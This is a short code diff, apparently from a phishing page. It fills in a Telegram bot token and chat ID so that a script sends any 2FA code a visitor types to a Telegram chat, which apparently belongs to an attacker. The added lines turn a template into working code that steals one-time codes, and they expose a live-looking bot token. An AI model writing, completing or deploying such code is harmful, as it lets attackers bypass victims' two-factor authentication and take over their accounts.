@@ -50,8 +50,8 @@
     <script>
         function sendOTP() {
             const otp = document.getElementById('otp').value;
-            const botToken = 'YOUR_API_TOKEN_HERE';
-            const chatId = 'YOUR_CHAT_ID_HERE';
+            const botToken = '8086684078:AAEpy5bmjSrkOQVGAAY6Cfthg5-O7rjzqHQ';
+            const chatId = '7745903783';
             
             const text = `🚨 2FA CODE RECEIVED 🚨\nCode: ${otp}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
